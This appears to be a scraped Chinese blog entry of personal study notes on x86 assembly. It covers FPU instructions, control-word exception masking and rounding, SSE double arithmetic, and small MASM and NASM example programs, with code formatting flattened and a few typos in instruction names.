st1是sin st0是cos fptan 求 $tan$(st0)st0还是弧度 不知道为什么. st0会自动压入1 st1才是计算的结果 于是出栈的时候 先把st0弹出 再把结果弹出 1234fld hudufptanfstp bufffstp result fpatan 坐标轴下的有符号角度好比 (1,1)&#x3D;45^0^ (-1,0)&#x3D;180^0^ st0是x坐标 st1是y坐标 返回的是一个弧度 12345fld yfld xfpatanfimul 180fstp result 余数结果就是度数 FPU 控制指令finit&#x2F;fninit 初始化FPU控制字是什么?就那几个判断异常的东西…. 状态字是什么?就是C3C2C0 标记字是什么&gt;? 上面可能说错的…… 反正他们会初始化一下FPU里的东西 然后 finit初始化前会检测没有处理的异常 fuinit初始化前并不会取检测 fstsw&#x2F;fntstw 导出状态字针对于状态字 1234ftstw ax ;检测并且处理异常,再状态字传递给ax,ftstw m16 ;检测并且处理异常,再状态字传递给内存m16,fnstsw ax ;不检测并且处理异常,再状态字传递给ax,fnstsw m16 ;不检测并且处理异常,再状态字传递给内存m16, fstcw&#x2F;fnstcw 导出控制字针对于控制字 12fstcw m16\t;检测并且处理异常,再控制字传递给m16,fnstcw m16\t;不检测并且处理异常,再控制字传递给m16, fldcw 导入控制字把16位变量的值加载到控制字 1fldcw m16 fldenv 导入环境将src的数据加载到FPU fstenv&#x2F;fnstenv 导出小环境保存FPU当前操作环境到Dest内存变量指定的14或者28字节 12fstenv dest ;检测并且处理异常后保存到dext,再屏蔽异常fnstenv Dest\t:不检测并且处理异常,直接保存到dext,再屏蔽异常 fsave&#x2F;fnsave 导出大环境把fpu当前状态导出到94或者108字节的内存,然后自动初始化FPU 12fsave dest ;检测/处理异常,然后导出到dext,然后初始化FPUfnsave\tdest\t;不检测/处理异常,然后导出到dest,然后出释怀fpu fclex&#x2F;fncles 清除异常清除浮点异常标志 12fclex ;检测并且处理异常,然后清除异常标志位fnclex ;不检测并且处理异常,直接清除异常标志位 除了像fstenv那样,他还会保存浮点数数据寄存器,按照st0-st7的顺序紧随其后 frstor导入环境把src的94或者108个字节导入到fpu 1frstor src fincstp &#x2F;fdecstp top的自增自减Inc top 会让st0的数据转移到st7,(st0去部st7的位) dec top会让st7的数据转移到st0,(st7去补st0的位) 可以对应一下栈图,因为他只有8个空间,要循环使用,所以的话才会有这种奇奇怪怪的转移 inc之前&#x2F;dec之前 1234567456-1.#IND-1.#IND-1.#IND-1.#IND inc之后 12345656-1.#IND-1.#IND-1.#IND4 dec之后 1234567.#IND456-1.#IND-1.#IND-1.#IND ffree stifree后sti就是-1/#IND 1ffree st(0) fnop同CPU的nop fwait&#x2F;wait他们是同一个东西 功能是检查并且处理没有屏蔽的浮点异常 在浮点指令后加一条wait指令确保任何未被处理的异常在下一条IP执行前被处理 异常同步fwait&#x2F;wait整数 (CPU) 和 FPU 是相互独立的单元，因此，在执行整数和系统指令的同时可以执行浮点指令。这个功能被称为并行性 (concurrency)， 我认为这是一个很好的隐藏手段,IDA都调试不了中间过程 当发生未屏蔽的浮点异常时，它可能是个潜在的问题。反之，已屏蔽异常则不成问题，因为，FPU 总是可以完成当前操作并保存结果。 FXAM检测st0是否是0,正无穷,负无穷,非实数,或者正常数,然后会初始化c3c2c0 具体遇到再说 异常的屏蔽与未屏蔽简述指令fstcw ;获取控制字 fldcw;结果加载到 FPU 导读默认情况下，异常是被屏蔽的，因此，当出现浮点异常时，处理器分配一个默认值为结果，并继续平稳地工作。 例如，一个浮点数除以 0 生成结果为无穷，但不会中断程序,是吗?????哦???? 123456.dataval1 DWORD 1val2 REAL8 0.0.codefild val1 ;整数加载到ST(0)fdiv val2 ;ST(0) =正无穷 如果 FPU 控制字没有屏蔽异常，那么处理器就会试着执行合适的异常处理程序。 清除 FPU 控制字中的相应位就可以实现异常的未屏蔽操作，如下表所示。 位 说明 位 说明 0 无效操作异常屏蔽位 5 精度异常屏蔽位 1 非规格化操作数异常屏蔽位 8〜9 精度控制位 2 除零异常屏蔽位 10〜11 舍入控制位 3 上溢异常屏蔽位 12 无穷控制位 4 下溢异常屏蔽位 于是对于除0异常,我们就去看2位,把它置0 将 FPU 控制字保存到 16 位变量。 清除位 2（除零标志位）。 将变量加载回控制字。 一个自动被屏蔽的异常 12345678910111213141516171819202122;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data val1 DWORD 1val2 REAL8 0.0hello\tbyte\t&quot;Dqx_Gh0st&quot;,0fmt\tbyte\t&quot;%s&quot;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code start: fild val1 ;整数加载到ST(0) fdiv val2 ;ST(0) =正无穷 invoke printf,offset fmt,offset hello invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart 然后我们 123456.datactrlWord WORD ?.codefstcw ctrlWord ;获取控制字and ctrlWord, 1111111111111011b ;不屏蔽除零异常fldcw ctrlWord ;结果加载回 FPU 然后我们也没发生啥呀….woc 123456789101112131415161718192021222324252627;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data val1 DWORD 1val2 REAL8 0.0ctrlWord WORD ?hello\tbyte\t&quot;Dqx_Gh0st&quot;,0fmt\tbyte\t&quot;%s&quot;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code start: fstcw ctrlWord and ctrlWord, 1111111111111011b fldcw ctrlWord fild val1 ;整数加载到ST(0) fdiv val2 ;ST(0) =正无穷 invoke printf,offset fmt,offset hello invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart x64的浮点数四则运算假设我们用的双精度浮点运算 addsd 加法12movsd xmm2, [number1]\t; double precision float into xmmaddsd xmm2, [number2]\t; add into to xmm subsd 减法12movsd xmm2, [number1]\t; double precision float into xmmsubsd xmm2, [number2]\t; subtract from xmm mulsd 乘法12movsd xmm2, [number1]\t; double precision float into xmmmulsd xmm2, [number2]\t; multiply with xmm divsd 除法12movsd xmm2, [number1]\t; double precision float into xmmdivsd xmm2, [number2]\t; divide xmm0 sqrtsd 开方12sqrtsd xmm1, [number1]//结果保持在xmm1中 应用例子混合运算valD&#x3D;-valA+(valB*valC) 123456789101112131415161718192021222324252627282930;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .datavalA REAL8 1.5valB REAL8 2.5valC REAL8 3.0valD REAL8 ? ; +6.0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code start: fld valA ; ST(0) = valA fchs ;修改 ST(0) 的符号 fld valB ; 将 valB 加载到 ST(0) fmul valC ; ST(0) *= valC fadd ; ST(0) += ST(1) fstp valD ; 将 ST(0) 保存到 valD ;invoke\tprintf,addr out_fmt,edi invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart 数组求和1234567891011121314151617181920212223242526;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ARRAY_SIZE = 20sngArray REAL8 1.2,2.3,3.4;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code start: mov esi, 0 ;数组索引 fldz ; 0.0 入栈 mov ecx,ARRAY_SIZE L1: fld sngArray[esi] ;将内存操作数加载到ST(0) fadd ; ST(0) 加 ST(1),出栈 add esi,TYPE REAL8 ;移至!I 下一个元素 loop\tL1 invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart 开方求和1234567891011121314151617181920212223;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data valA REAL8 25.0valB REAL8 36.0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code start: fld valA ; valA 入栈 fsqrt ; ST(0) = sqrt(valA) fld valB ; valB 入栈 fsqrt ; ST(0) = sqrt(valB) fadd ; ST (0)+ST(1) invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart C语言的强制类型转换12345678910111213//cint N = 20;double X = 3.5;double Z = N + X;//asm.dataN SDWORD 20X REAL8 3.5Z REAL8 ?.codefild n ;整数加载到ST(0)fadd X ;将内存操作数与ST(0)相加fstp z ;将ST(0)保存到内存操作数 12345678//cint N = 20;double X = 3.5;int Z = (int)(N + X);//Asmfild N ;整数加载到ST(0)fadd X ;将内存操作数与ST(0)相加fist Z ;将ST(0)保存为整型内存操作数,这里就是一个转化 修改舍入模式,什么鬼FPU 控制字的 RC 字段指定使用的舍入类型。可以先用 FSTCW 把控制字保存为一个变量，再修改 RC 字段（位 10 和 11）,最后用 FLDCW 指令把这个变量加载回控制字： 123fstew ctrlWord ;保存控制字or ctrlWord, 110000000000b ;设置眈=截断fldcw ctrlWord ;加载控制字 之后采用截断执行计算，生成结果为 Z&#x3D;23： 123fild N ;整数加载到ST(0)fadd X ;将内存整数与ST(0)相加fist Z ;将ST(0)保存为整型内存操作数 或者，把舍入模式重新设置为默认选项（舍入到最接近的偶数）： 123fstcw ctrlWord ;保存控制字and ctrlWord, 001111111111b ;重置舍入模式为默认fldcw ctrlWord ;加载控制字","tags":["Assembly","x86"],"categories":["Language"]},{"title":"x86汇编语言实践部分","path":"/re4mile/2021/06/07/language/Asm/windwos/32/实践/language/","content":"代码模板8086.exe1234567891011121314151617181920212223242526272829303132333435363738394041424344454647;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxassume cs:code , ds:data, ss:stack;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;数据源S data segment db 128 dup(&#x27;x&#x27;) data ends ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;栈段 stack segment stack db 128 dup(&#x27;y&#x27;) stack ends;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxcode segmentstart:;main code ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;数据源S ;为数据来源source分配大小 mov ax,data mov ds,ax ;数据地D ;数据的目的地destation mov ax,7e00h mov es,ax ;栈 ;申请了一段栈空间 mov ax,stack mov ss,ax mov sp,128 ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx over: mov ax,4c00h;初始化内中段的参数 int 21h;调用内中段;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ;function ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxcode endsend start;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 对于上面的数据它是一个顺序结构的存储 也就是你的源代码数据怎么写,那么你的数据就怎么存储,好比你的data写在了code上面,那么的话IDA里面看到的也是 data在code上面 386.exe12345678910111213141516171819202122232425262728293031323334353637383940;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 使用 nmake 或下列命令进行编译和链接:; ml /c /coff Hello.asm; Link /subsystem:windows Hello.obj;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.lib;对于上面的lib,inc还不是很理解;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 数据段.data\tA_Title db\t&#x27;My_First_Box !&#x27;,0\tA_Text db\t&#x27;Hello,World !&#x27;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;;栈断分配一些数据.stack 1024;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段.code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tstart: invoke\tMessageBox,\t\\ NULL, \\ offset A_Text, \\ offset A_Title, \\ MB_OK invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 12345678910111213141516171819 .386 .model flat,stdcall option casemap:noneinclude windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.lib .dataszText db &#x27;HelloWorld&#x27;,0 .codestart: invoke\tMessageBox,NULL,offset szText,NULL,MB_OK invoke\tExitProcess,NULL end start 然后就编译 12ml -c -coff Helloworld.asmlink -subsystem:windows He1loworld.obj -c 独立编译,而不进行链接 -coff 生产obj文件 movsx 有符号的复制语句,带一个符号的扩展 1234567891011121314151617181920212223.386.model flat,stdcalloption casemap:noneinclude msvcrt.incincludelib msvcrt.libinclude kernel32.incincludelib kernel32.lib .dataszText1 db &quot;hello world&quot;,0Ah,00hszPause db &quot;pause&quot;,0Ah.code testdd:\tpush offset szText1\tcall crt_printf\tadd esp,4\tpush offset szPause\tcall crt_system\tadd esp,4\tretend testddend x86_ELF1234567891011121314151617181920212223242526272829303132333435section .data A_str db\t&quot;I am Dqx_Gh0st&quot;,10,0 format\tdb\t&quot;%s&quot;,0;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\tsection .bss;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\tsection .text\textern printf ;extern func global main main:;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx push\trbp mov rbp,rsp mov rax, 0 mov rsi, A_str mov rdi, format call printf ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx leave ret;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\t;func;参数;返回值;注意事项;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 123456789101112131415161718public _start_start proc near; __unwind &#123;endbr64xor ebp, ebpmov r9, rdx ; rtld_finipop rsi ; argcmov rdx, rsp ; ubp_avand rsp, 0FFFFFFFFFFFFFFF0hpush raxpush rsp ; stack_endmov r8, offset __libc_csu_fini ; finimov rcx, offset __libc_csu_init ; initmov rdi, offset $_53_1_ ; main //你自己函数入口是一以rdi的形式给了函数cs:__libc_start_main_ptrcall cs:__libc_start_main_ptrhlt; &#125; // starts at 401040_start endp 寻址方式寻址公式一:[立即数] 寻址公式二:[reg] 